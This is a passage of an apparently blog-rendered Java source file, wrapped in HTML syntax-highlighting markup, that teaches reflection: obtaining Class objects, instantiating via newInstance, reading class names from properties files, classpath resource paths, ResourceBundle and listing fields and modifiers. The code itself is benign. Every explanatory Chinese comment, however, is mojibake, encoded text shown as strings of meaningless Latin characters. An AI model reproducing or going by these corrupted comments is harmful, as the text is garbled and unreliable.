class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> javase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javase.reflectBean.Student;</span><br><span class="line"><span class="keyword">import</span> javase.reflectBean.UserService;</span><br><span class="line"><span class="keyword">import</span> javase.reflectBean.Vip;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"><span class="keyword">import</span> java.util.ResourceBundle;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">è¦æ“ä½œä¸€ä¸ªç±»çš„å­—èŠ‚ç ï¼Œéœ€è¦é¦–å…ˆè·å–åˆ°è¿™ä¸ªç±»çš„å­—èŠ‚ç ï¼Œæ€ä¹ˆè·å–java.lang.Classå®ä¾‹ï¼Ÿ</span></span><br><span class="line"><span class="comment">    ä¸‰ç§æ–¹å¼</span></span><br><span class="line"><span class="comment">        ç¬¬ä¸€ç§ï¼šClass c = Class.forName(&quot;å®Œæ•´ç±»åå¸¦åŒ…å&quot;);</span></span><br><span class="line"><span class="comment">        ç¬¬äºŒç§ï¼šClass c = å¯¹è±¡.getClass();</span></span><br><span class="line"><span class="comment">        ç¬¬ä¸‰ç§ï¼šClass c = ä»»ä½•ç±»å‹.class;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        ç¬¬ä¸€ç§æ–¹å¼ï¼šClass.forName()</span></span><br><span class="line"><span class="comment">            1ã€é™æ€æ–¹æ³•</span></span><br><span class="line"><span class="comment">            2ã€æ–¹æ³•çš„å‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</span></span><br><span class="line"><span class="comment">            3ã€å­—ç¬¦ä¸²éœ€è¦çš„æ˜¯ä¸€ä¸ªå®Œæ•´ç±»åã€‚</span></span><br><span class="line"><span class="comment">            4ã€å®Œæ•´ç±»åå¿…é¡»å¸¦æœ‰åŒ…åã€‚java.langåŒ…ä¹Ÿä¸èƒ½çœç•¥ã€‚</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.String&quot;</span>); <span class="comment">// c1ä»£è¡¨String.classæ–‡ä»¶ï¼Œæˆ–è€…è¯´c1ä»£è¡¨Stringç±»å‹ã€‚</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Integer&quot;</span>); <span class="comment">// c2ä»£è¡¨Integerç±»å‹</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c3</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.Date&quot;</span>); <span class="comment">// c3ä»£è¡¨Dateç±»å‹</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç¬¬äºŒç§æ–¹å¼ï¼šjavaä¸­ä»»ä½•ä¸€ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªæ–¹æ³•ï¼šgetClass()</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c4</span> <span class="operator">=</span> a.getClass(); <span class="comment">// c4ä»£è¡¨String.classå­—èŠ‚ç æ–‡ä»¶ï¼›c4ä»£è¡¨Stringç±»å‹ã€‚</span></span><br><span class="line">        System.out.println(c4 == c1);<span class="comment">//trueï¼ˆ==åˆ¤æ–­çš„æ˜¯å¯¹è±¡çš„å†…å­˜åœ°å€ã€‚ï¼‰</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Date</span> <span class="variable">time</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c5</span> <span class="operator">=</span> time.getClass();</span><br><span class="line">        System.out.println(c5 == c3);<span class="comment">//true(c5å’Œc3ä¸¤ä¸ªå˜é‡ä¸­ä¿å­˜çš„å†…å­˜åœ°å€éƒ½æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æŒ‡å‘æ–¹æ³•åŒºä¸­çš„å­—èŠ‚ç æ–‡ä»¶ã€‚)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç¬¬ä¸‰ç§æ–¹å¼ï¼šjavaè¯­è¨€ä¸­ä»»ä½•ä¸€ç§ç±»å‹ï¼ŒåŒ…æ‹¬åŸºæœ¬æ•°æ®ç±»å‹ï¼Œå®ƒéƒ½æœ‰.classå±æ€§ã€‚</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">i</span> <span class="operator">=</span> Integer.class; <span class="comment">//iä»£è¡¨Integerç±»å‹</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">d</span> <span class="operator">=</span> Date.class; <span class="comment">// dä»£è¡¨Dateç±»å‹</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">f</span> <span class="operator">=</span> <span class="type">float</span>.class; <span class="comment">//fä»£è¡¨floatç±»å‹</span></span><br><span class="line"></span><br><span class="line">        System.out.println(i == c2);<span class="comment">//true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">è·å–åˆ°Classï¼Œèƒ½å¹²ä»€ä¹ˆï¼Ÿ</span></span><br><span class="line"><span class="comment">    é€šè¿‡Classçš„newInstance()æ–¹æ³•æ¥å®ä¾‹åŒ–å¯¹è±¡ã€‚</span></span><br><span class="line"><span class="comment">    æ³¨æ„ï¼šnewInstance()æ–¹æ³•å†…éƒ¨å®é™…ä¸Šè°ƒç”¨äº†æ— å‚æ•°æ„é€ æ–¹æ³•ï¼Œå¿…é¡»ä¿è¯æ— å‚æ„é€ å­˜åœ¨æ‰å¯ä»¥ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest02</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">// ä¸‹é¢è¿™æ®µä»£ç æ˜¯ä»¥åå°„æœºåˆ¶çš„æ–¹å¼åˆ›å»ºå¯¹è±¡ã€‚</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// é€šè¿‡åå°„æœºåˆ¶ï¼Œè·å–Classï¼Œé€šè¿‡Classæ¥å®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.User&quot;</span>);</span><br><span class="line">        <span class="comment">// newInstance() è¿™ä¸ªæ–¹æ³•ä¼šè°ƒç”¨Userè¿™ä¸ªç±»çš„æ— å‚æ•°æ„é€ æ–¹æ³•ï¼Œå®Œæˆå¯¹è±¡çš„åˆ›å»ºã€‚</span></span><br><span class="line">        <span class="comment">// é‡ç‚¹æ˜¯ï¼šnewInstance()è°ƒç”¨çš„æ˜¯æ— å‚æ„é€ ï¼Œå¿…é¡»ä¿è¯æ— å‚æ„é€ æ˜¯å­˜åœ¨çš„ï¼</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> c.newInstance();</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">éªŒè¯åå°„æœºåˆ¶çš„çµæ´»æ€§ã€‚</span></span><br><span class="line"><span class="comment">    javaä»£ç å†™ä¸€éï¼Œå†ä¸æ”¹å˜javaæºä»£ç çš„åŸºç¡€ä¹‹ä¸Šï¼Œå¯ä»¥åšåˆ°ä¸åŒå¯¹è±¡çš„å®ä¾‹åŒ–ã€‚</span></span><br><span class="line"><span class="comment">    éå¸¸ä¹‹çµæ´»ã€‚ï¼ˆç¬¦åˆOCPå¼€é—­åŸåˆ™ï¼šå¯¹æ‰©å±•å¼€æ”¾ï¼Œå¯¹ä¿®æ”¹å…³é—­ã€‚ï¼‰</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest03</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// ä»¥ä¸‹ä»£ç æ˜¯çµæ´»çš„ï¼Œä»£ç ä¸éœ€è¦æ”¹åŠ¨ï¼Œå¯ä»¥ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œé…ç½®æ–‡ä»¶ä¿®æ”¹ä¹‹åï¼Œå¯ä»¥åˆ›å»ºå‡ºä¸åŒçš„å®ä¾‹å¯¹è±¡ã€‚</span></span><br><span class="line">        <span class="comment">// é€šè¿‡IOæµè¯»å–reflectClassInfo.propertiesæ–‡ä»¶</span></span><br><span class="line">        <span class="type">FileReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;Practice/reflectClassInfo1.properties&quot;</span>);</span><br><span class="line">        <span class="comment">// åˆ›å»ºå±æ€§ç±»å¯¹è±¡Map</span></span><br><span class="line">        <span class="type">Properties</span> <span class="variable">pro</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();<span class="comment">// key valueéƒ½æ˜¯String</span></span><br><span class="line">        <span class="comment">//åŠ è½½</span></span><br><span class="line">        pro.load(reader);</span><br><span class="line">        reader.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é€šè¿‡keyè·å–value</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> pro.getProperty(<span class="string">&quot;className&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é€šè¿‡åå°„æœºåˆ¶å®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> c.newInstance();</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ç ”ç©¶ä¸€ä¸‹ï¼šClass.forName()å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ</span></span><br><span class="line"><span class="comment">    è®°ä½ï¼Œé‡ç‚¹ï¼š</span></span><br><span class="line"><span class="comment">        å¦‚æœä½ åªæ˜¯å¸Œæœ›ä¸€ä¸ªç±»çš„é™æ€ä»£ç å—æ‰§è¡Œï¼Œå…¶å®ƒä»£ç ä¸€å¾‹ä¸æ‰§è¡Œï¼Œ</span></span><br><span class="line"><span class="comment">        ä½ å¯ä»¥ä½¿ç”¨ï¼š</span></span><br><span class="line"><span class="comment">            Class.forName(&quot;å®Œæ•´ç±»å&quot;);</span></span><br><span class="line"><span class="comment">        è¿™ä¸ªæ–¹æ³•çš„æ‰§è¡Œä¼šå¯¼è‡´ç±»åŠ è½½ï¼Œç±»åŠ è½½æ—¶ï¼Œé™æ€ä»£ç å—æ‰§è¡Œã€‚</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">æç¤ºï¼š</span></span><br><span class="line"><span class="comment">    åé¢JDBCæŠ€æœ¯çš„æ—¶å€™æˆ‘ä»¬è¿˜éœ€è¦ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest04</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Class.forName()è¿™ä¸ªæ–¹æ³•çš„æ‰§è¡Œä¼šå¯¼è‡´ï¼šç±»åŠ è½½ã€‚</span></span><br><span class="line">        Class.forName(<span class="string">&quot;javase.MyClass&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;MyClassä¸­çš„é™æ€ä»£ç å—æ‰§è¡Œäº†ï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ç ”ç©¶ä¸€ä¸‹æ–‡ä»¶è·¯å¾„çš„é—®é¢˜ã€‚</span></span><br><span class="line"><span class="comment">æ€ä¹ˆè·å–ä¸€ä¸ªæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ã€‚ä»¥ä¸‹è®²è§£çš„è¿™ç§æ–¹å¼æ˜¯é€šç”¨çš„ã€‚ä½†å‰ææ˜¯ï¼šæ–‡ä»¶éœ€è¦åœ¨ç±»è·¯å¾„ä¸‹ã€‚æ‰èƒ½ç”¨è¿™ç§æ–¹å¼ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AboutPath</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">        <span class="comment">// è¿™ç§æ–¹å¼çš„è·¯å¾„ç¼ºç‚¹æ˜¯ï¼šç§»æ¤æ€§å·®ï¼Œåœ¨IDEAä¸­é»˜è®¤çš„å½“å‰è·¯å¾„æ˜¯projectçš„æ ¹ã€‚</span></span><br><span class="line">        <span class="comment">// è¿™ä¸ªä»£ç å‡è®¾ç¦»å¼€äº†IDEAï¼Œæ¢åˆ°äº†å…¶å®ƒä½ç½®ï¼Œå¯èƒ½å½“å‰è·¯å¾„å°±ä¸æ˜¯projectçš„æ ¹äº†ï¼Œè¿™æ—¶è¿™ä¸ªè·¯å¾„å°±æ— æ•ˆäº†ã€‚</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;Practice/src/reflectClassInfo2.properties&quot;</span>);</span><br><span class="line">        System.out.println(reader.exists() + <span class="string">&quot; &quot;</span> + reader.getPath());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ¥ä¸‹æ¥è¯´ä¸€ç§æ¯”è¾ƒé€šç”¨çš„ä¸€ç§è·¯å¾„ã€‚å³ä½¿ä»£ç æ¢ä½ç½®äº†ï¼Œè¿™æ ·ç¼–å†™ä»ç„¶æ˜¯é€šç”¨çš„ã€‚</span></span><br><span class="line">        <span class="comment">// æ³¨æ„ï¼šä½¿ç”¨ä»¥ä¸‹é€šç”¨æ–¹å¼çš„å‰ææ˜¯ï¼šè¿™ä¸ªæ–‡ä»¶å¿…é¡»åœ¨ç±»è·¯å¾„ä¸‹ã€‚</span></span><br><span class="line">        <span class="comment">// ä»€ä¹ˆç±»è·¯å¾„ä¸‹ï¼Ÿæ–¹å¼åœ¨srcä¸‹çš„éƒ½æ˜¯ç±»è·¯å¾„ä¸‹ã€‚ã€è®°ä½å®ƒã€‘</span></span><br><span class="line">        <span class="comment">// srcæ˜¯ç±»çš„æ ¹è·¯å¾„ã€‚</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        è§£é‡Šï¼š</span></span><br><span class="line"><span class="comment">            Thread.currentThread() å½“å‰çº¿ç¨‹å¯¹è±¡</span></span><br><span class="line"><span class="comment">            getContextClassLoader() æ˜¯çº¿ç¨‹å¯¹è±¡çš„æ–¹æ³•ï¼Œå¯ä»¥è·å–åˆ°å½“å‰çº¿ç¨‹çš„ç±»åŠ è½½å™¨å¯¹è±¡ã€‚</span></span><br><span class="line"><span class="comment">            getResource() ã€è·å–èµ„æºã€‘è¿™æ˜¯ç±»åŠ è½½å™¨å¯¹è±¡çš„æ–¹æ³•ï¼Œå½“å‰çº¿ç¨‹çš„ç±»åŠ è½½å™¨é»˜è®¤ä»ç±»çš„æ ¹è·¯å¾„ä¸‹åŠ è½½èµ„æºã€‚</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().getResource(<span class="string">&quot;reflectClassInfo2.properties&quot;</span>).getPath();</span><br><span class="line">        <span class="comment">// é‡‡ç”¨ä»¥ä¸Šçš„ä»£ç å¯ä»¥æ‹¿åˆ°ä¸€ä¸ªæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ã€‚</span></span><br><span class="line">        <span class="comment">// /D:/996-CodeSection/001-IDEA/0.JavaSE/TestProject/out/production/practice/reflectClassInfo2.properties</span></span><br><span class="line">        System.out.println(path);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">path2</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().getResource(<span class="string">&quot;javase/reflectBean/db.properties&quot;</span>).getPath();</span><br><span class="line">        <span class="comment">// /D:/996-CodeSection/001-IDEA/0.JavaSE/TestProject/out/production/practice/javase/reflectBean/db.properties</span></span><br><span class="line">        System.out.println(path2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IoPropertiesTest</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//ä»¥å‰</span></span><br><span class="line">        <span class="comment">/*String path = Thread.currentThread().getContextClassLoader().getResource(&quot;reflectClassInfo2.properties&quot;).getPath();</span></span><br><span class="line"><span class="comment">        FileReader reader = new FileReader(path);*/</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//ç°åœ¨</span></span><br><span class="line">        <span class="comment">// ç›´æ¥ä»¥æµçš„å½¢å¼è¿”å›ã€‚</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">reader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().getResourceAsStream(<span class="string">&quot;reflectClassInfo2.properties&quot;</span>);</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">pro</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        pro.load(reader);</span><br><span class="line">        reader.close();</span><br><span class="line">        <span class="comment">// é€šè¿‡keyè·å–value</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> pro.getProperty(<span class="string">&quot;className&quot;</span>);</span><br><span class="line">        System.out.println(className);<span class="comment">// java.util.Date</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">java.utilåŒ…ä¸‹æä¾›äº†ä¸€ä¸ªèµ„æºç»‘å®šå™¨ï¼Œä¾¿äºè·å–å±æ€§é…ç½®æ–‡ä»¶ä¸­çš„å†…å®¹ã€‚</span></span><br><span class="line"><span class="comment">ä½¿ç”¨ä»¥ä¸‹è¿™ç§æ–¹å¼çš„æ—¶å€™ï¼Œå±æ€§é…ç½®æ–‡ä»¶xxx.propertieså¿…é¡»æ”¾åˆ°ç±»è·¯å¾„ä¸‹ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ResourceBundleTest</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// èµ„æºç»‘å®šå™¨ï¼Œåªèƒ½ç»‘å®šxxx.propertiesæ–‡ä»¶ã€‚å¹¶ä¸”è¿™ä¸ªæ–‡ä»¶å¿…é¡»åœ¨ç±»è·¯å¾„ä¸‹ã€‚æ–‡ä»¶æ‰©å±•åä¹Ÿå¿…é¡»æ˜¯properties</span></span><br><span class="line">        <span class="comment">// å¹¶ä¸”åœ¨å†™è·¯å¾„çš„æ—¶å€™ï¼Œè·¯å¾„åé¢çš„æ‰©å±•åä¸èƒ½å†™ã€‚</span></span><br><span class="line"><span class="comment">//        ResourceBundle bundle = ResourceBundle.getBundle(&quot;reflectClassInfo2&quot;);</span></span><br><span class="line">        <span class="type">ResourceBundle</span> <span class="variable">bundle</span> <span class="operator">=</span> ResourceBundle.getBundle(<span class="string">&quot;javase/reflectBean/db&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> bundle.getString(<span class="string">&quot;className&quot;</span>);</span><br><span class="line">        System.out.println(className);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">åå°„Studentç±»å½“ä¸­æ‰€æœ‰çš„Fieldï¼ˆäº†è§£ä¸€ä¸‹ï¼‰</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest05</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">studentClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.Student&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> studentClass.getName();<span class="comment">// Classç±»çš„getNameæ–¹æ³•</span></span><br><span class="line">        System.out.println(<span class="string">&quot;å®Œæ•´ç±»åï¼š &quot;</span> + className);</span><br><span class="line">        <span class="type">String</span> <span class="variable">simpleName</span> <span class="operator">=</span> studentClass.getSimpleName();<span class="comment">// Classç±»çš„getNameæ–¹æ³•</span></span><br><span class="line">        System.out.println(<span class="string">&quot;ç®€ç±»åï¼š &quot;</span> + simpleName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è·å–publicä¿®é¥°çš„å±æ€§</span></span><br><span class="line">        Field[] fields1 = studentClass.getFields();</span><br><span class="line">        System.out.println(fields1.length);<span class="comment">// 2</span></span><br><span class="line">        System.out.println(fields1[<span class="number">0</span>].getName() + <span class="string">&quot; &quot;</span> + fields1[<span class="number">1</span>].getName()); <span class="comment">//Fieldç±»ä¸­çš„getNameçŠ¯æ³•</span></span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è·å–æ‰€æœ‰çš„å±æ€§</span></span><br><span class="line">        Field[] fields2 = studentClass.getDeclaredFields();</span><br><span class="line">        System.out.println(fields2.length);</span><br><span class="line">        <span class="keyword">for</span> (Field f : fields2)&#123;</span><br><span class="line">            System.out.println(f.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è·å–å±æ€§çš„ä¿®é¥°ç¬¦åˆ—è¡¨</span></span><br><span class="line">        <span class="keyword">for</span> (Field f : fields2)&#123;</span><br><span class="line">            <span class="comment">// è·å–å±æ€§çš„ä¿®é¥°ç¬¦åˆ—è¡¨,è¿”å›çš„ä¿®é¥°ç¬¦æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œæ¯ä¸ªæ•°å­—æ˜¯ä¿®é¥°ç¬¦çš„ä»£å·</span></span><br><span class="line">            <span class="comment">// ç”¨Modifierç±»çš„toStringè½¬æ¢æˆå­—ç¬¦ä¸²</span></span><br><span class="line">            System.out.println(Modifier.toString(f.getModifiers()));</span><br><span class="line">            System.out.println(f.getType().getSimpleName());<span class="comment">// è·å–å±æ€§çš„ç±»å‹</span></span><br><span class="line">            System.out.println(f.getName());<span class="comment">// è·å–å±æ€§çš„åå­—</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//é€šè¿‡åå°„æœºåˆ¶ï¼Œåç¼–è¯‘ä¸€ä¸ªç±»çš„å±æ€§Fieldï¼ˆäº†è§£ä¸€ä¸‹ï¼‰</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReflectTest06</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">studentClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javase.reflectBean.Student&quot;</span>);</span><br><span class="line">        s.append(Modifier.toString(studentClass.getModifiers()) + <span class="string">&quot; class &quot;</span> + studentClass.getSimpleName() + <span class="string">&quot; &#123;\n&quot;</span>);<span class="comment">// Classç±»çš„getNameæ–¹æ³•</span></span><br><span class="line">        <span class="comment">//è·å–æ‰€æœ‰çš„å±æ€§</span></span><br><span class="line">        Field[] fields = studentClass.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field f : fields)&#123;</span><br><span class="line">            s.append(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            <span class="comment">// è·å–å±æ€§çš„ä¿®é¥°ç¬¦åˆ—è¡¨,è¿”å›çš„ä¿®é¥°ç¬¦æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œæ¯ä¸ªæ•°å­—æ˜¯ä¿®é¥°ç¬¦çš„ä»£å·</span></span><br><span class="line">            <span class="comment">// ç”¨Modifierç±»çš„toStringè½¬æ¢æˆå­—ç¬¦ä¸²</span></span><br><span class="line">            s.append(Modifier.toString(f.getModifiers()));</span><br><span class="line">            <span class="keyword">if</span> (f.getModifiers() != <span class="number">0</span>) s.append(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            s.append(f.getType().getSimpleName());<span class="comment">// è·å–å±æ€§çš„ç±»å‹</span></span><br><span class="line">            s.append(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            s.append(f.getName());<span class="comment">// è·å–å±æ€§çš„åå­—</span></span><br><span class="line">            s.append(<span class="string">&quot;;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        s.append(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">å¿…é¡»æŒæ¡ï¼š</span></span><br><span class="line"><span class="comment">    æ€ä¹ˆé€šè¿‡åå°„æœºåˆ¶è®¿é—®ä¸€ä¸ªjavaå¯¹è±¡çš„å±æ€§ï¼Ÿ</span></span><br><span class="line"><span class="comment">        ç»™å±æ€§èµ‹å€¼set</span></span><br><span class="line"><span class="comment">        